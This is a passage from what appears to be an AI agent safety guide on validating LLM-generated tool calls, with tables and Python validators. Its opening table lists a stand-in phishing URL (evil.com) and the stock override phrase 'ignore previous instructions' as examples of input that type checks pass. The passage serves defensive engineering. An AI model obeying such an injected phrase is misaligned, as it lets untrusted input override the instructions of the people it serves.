| **Business logic correctness** | `{"amount": -100}` passes type check for `float` but violates business rules | Domain validation, invariant checks |
| **Content security** | `{"url": "https://evil.com/phish"}` is a valid URL string | URL blocklist, reputation checks |
| **Rate limiting** | `{"count": 5}` is a valid `int` but may exhaust API quota | Rate limiter, budget tracking |
| **AuthZ vs AuthN** | `{"user_id": 123}` is valid `int` but caller may not own user 123 | Access control, ownership checks |
| **Encoding attacks** | `{"name": "valid.txt"}` is valid `str` but path may contain unicode normalization tricks | Unicode normalization, path sanitization |
| **Timing attacks** | Type checking is constant-time per field, but not constant-time overall | Constant-time comparison for secrets |
| **AI prompt injection** | `{"prompt": "ignore previous instructions"}` is valid `str` | Prompt guardrails, output monitoring |

### The Iceberg Model

Type checking handles the **tip of the iceberg** — structural conformance. Beneath the surface:

```
       ╱╲         Type checking: is it the right shape?
      ╱  ╲        ─────────────────────────────────
     ╱    ╲       Value validation: is it in the right range?
    ╱      ╲      Semantic validation: does it make sense?
   ╱        ╲     Business logic: is this action allowed?
  ╱          ╲    Authorization: does this caller have permission?
 ╱            ╲   Audit: will we know who did what?
╱━━━━━━━━━━━━━━╲  Monitoring: are we seeing attack patterns?
```

A security architecture must layer type checking with these deeper controls.

---

## Comparison: Static vs Runtime Type Checking for Agent Security

| Dimension | Static Type Checking | Runtime Type Checking |
|---|---|---|
| **When checked** | At development time (compile/analysis) | At execution time (before tool dispatch) |
| **What it catches** | Structural mismatches, missing fields, wrong generics | Actual runtime values from LLM calls, user input |
| **Applicable to LLM output?** | No — LLM output arrives as untyped JSON at runtime | Yes — this is the primary use case |
| **Performance cost** | Zero (compile-time only) | Per-call overhead (microseconds to milliseconds) |
| **False positives** | Structural issues that would never occur at runtime | Coercible values that are rejected |
| **False negatives** | Cannot catch runtime type confusion from external input | Cannot catch structural issues in unreachable code paths |
| **Tooling** | mypy, pyright, TypeScript compiler, Java compiler | Pydantic, TypeBox, Zod, isinstance(), type guards |
| **Best for** | Validating agent source code, tool definitions, internal APIs | Validating LLM-generated tool calls, user input at boundaries |
| **Integration** | CI/CD pipeline, IDE, pre-commit hooks | Agent middleware, tool dispatch layer, API gateway |

### Recommendation: Use Both

```python
# Static: ensures tool definitions are consistent (checked by mypy)
def aggregate_tool(
    user_ids: list[int],
    operation: Literal["sum", "avg", "count"],
) -> dict[str, float]:
    ...

# Runtime: validates LLM-generated calls at the boundary
schema = {
    "user_ids": list[int],
    "operation": str,  # Further validated by Literal check
}
validated = type_checker.validate_tool_args("aggregate", llm_call, schema)
```

**Static typing** catches developer errors — passing wrong types in tool definitions, forgetting fields, mismatched schemas.

**Runtime typing** catches attacker/LLM errors — malformed input, type confusion, injection attempts.

**Combined**: static typing ensures the validation code itself is correct; runtime typing ensures untrusted input is properly validated.

---

## Engineering Optimization — Pre-compiled Type Validators & Lazy Validation

### Problem

Validating every field of every tool call is expensive, especially for deeply nested structures and frequently-called tools. An agent handling 100 tool calls/second with 10 parameters each executes 1000 type checks per second.

### Optimization 1: Pre-compiled Type Validators

Generate validator functions at schema definition time, not at call time:

```python
from typing import Any, Callable, get_origin, get_args
import functools

class TypeValidator:
    """Pre-compiled type validator for a single type."""

    def __init__(self, expected_type: type):
        self.expected_type = expected_type
        self._validator = self._compile(expected_type)

    def __call__(self, value: Any) -> Any:
        return self._validator(value)

    @staticmethod
    def _compile(t: type) -> Callable[[Any], Any]:
        """Recursively build a validator function tree."""
        origin = get_origin(t)

        if origin is list:
            item_type = get_args(t)[0]
            item_validator = TypeValidator._compile(item_type)

            def validate_list(v: Any) -> list:
                if not isinstance(v, list):
                    raise TypeCheckError("", f"list[{item_type.__name__}]", type(v).__name__)
                return [item_validator(item) for item in v]
            return validate_list

        if origin is dict:
            key_t, val_t = get_args(t)
            key_v = TypeValidator._compile(key_t)
            val_v = TypeValidator._compile(val_t)

            def validate_dict(v: Any) -> dict:
                if not isinstance(v, dict):
                    raise TypeCheckError("", f"dict", type(v).__name__)
                return {key_v(k): val_v(v) for k, v in v.items()}
            return validate_dict

        if origin is Union:
            types = get_args(t)
            validators = [(TypeValidator._compile(tp), tp) for tp in types if tp is not type(None)]

            def validate_union(v: Any) -> Any:
                if v is None and type(None) in types:
                    return None
                for validator, tp in validators:
                    try:
                        return validator(v)
                    except (TypeError, ValueError):
                        continue
                raise TypeCheckError(
                    "", f"Union[{', '.join(t.__name__ for t in types)}]", type(v).__name__
                )
            return validate_union

        # Plain type
        def validate_plain(v: Any) -> Any:
            if isinstance(v, t):
                return v
            raise TypeCheckError("", t.__name__, type(v).__name__)
        return validate_plain


# Usage: pre-compile validators once at startup
SCHEMA_VALIDATORS = {
    "query_db": {
        name: TypeValidator(tp) for name, tp in TOOL_SCHEMAS["query_db"].items()
    },
}

# At call time: O(1) dict lookup + fast validator call
def validate_fast(tool: str, args: dict) -> dict:
    validators = SCHEMA_VALIDATORS[tool]
    return {name: validators[name](args[name]) for name in validators}
```

### Optimization 2: Lazy Validation for Complex Types

Only validate complex types when they are actually accessed:

```python
from typing import Any
import functools

class LazyValidatedDict:
    """
    Wraps a dict with deferred type validation.
    Validates only the fields that are accessed.
    """

    def __init__(self, data: dict, schema: dict[str, type]):
        self._data = data
        self._schema = schema
        self._validated: set[str] = set()

    def __getitem__(self, key: str) -> Any:
        if key not in self._schema:
            raise KeyError(f"Unknown field: {key}")

        if key not in self._validated:
            expected = self._schema[key]
            value = self._data[key]

            # Quick type check first
            if not isinstance(value, expected):
                raise TypeCheckError(key, expected.__name__, type(value).__name__)

            self._validated.add(key)

        return self._data[key]

    def __contains__(self, key: str) -> bool:
        return key in self._schema

    def get(self, key: str, default: Any = None) -> Any:
        try:
            return self[key]
        except (KeyError, TypeCheckError):
            return default


# Usage: wrap args lazily
lazy_args = LazyValidatedDict(llm_call, tool_schema)
# No validation performed yet
# Only when accessed:
result = lazy_args["query"]  # Validates "query" only
```

### Optimization 3: Validation Cache for Repeated Types

```python
import hashlib
from typing import Any

class ValidationCache:
    """Cache validation results for repeated identical values."""

    def __init__(self, max_size: int = 10000):
        self._cache: dict[int, bool] = {}
        self._max_size = max_size

    def validate(self, value: Any, expected_type: type) -> bool:
        # Only cache hashable, simple types
        if not isinstance(value, (str, int, float, bool, type(None))):
            return self._validate_uncached(value, expected_type)

        key = self._make_key(value, expected_type)
        if key in self._cache:
            return self._cache[key]

        result = self._validate_uncached(value, expected_type)
        if len(self._cache) < self._max_size:
            self._cache[key] = result
        return result

    @staticmethod
    def _make_key(value: Any, expected_type: type) -> int:
        return hash((type(value), value, id(expected_type)))

    @staticmethod
    def _validate_uncached(value: Any, expected_type: type) -> bool:
        return isinstance(value, expected_type)

# Common values like True, False, None, 0, 1, "" are cached after first check
```

### Performance Comparison

| Approach | Time (1M checks) | Memory | Best For |
|---|---|---|---|
| Plain `isinstance()` | ~0.02s | None | Simple scalar checks |
| Pydantic BaseModel | ~0.5s | Model definition | Full schema validation |
| Pre-compiled validator | ~0.08s | Validator tree (small) | High-throughput tool dispatch |
| Lazy validation | ~0.01s (first access) | Wrapper object | Deeply nested rarely-accessed data |
| Validation cache | ~0.005s (cached hit) | Cache table (configurable) | Repeated same-value checks |

### Engineering Recommendation

For production agent systems:

1. **Pre-compile** validators for all tool schemas at startup
2. **Strict mode** for sensitive tools (database, filesystem, network)
3. **Flexible mode** with coercion for low-sensitivity tools (search, formatting)
4. **Lazy validation** for complex nested arguments (document processing, multi-step configs)
5. **Validation cache** for high-frequency tool calls with repeated primitive values
6. **Audit logging** for all type check failures with full context (tool name, parameter, actual value, expected type)

---

*This document is part of the AI Agent Safety Module — Input Validation section.*
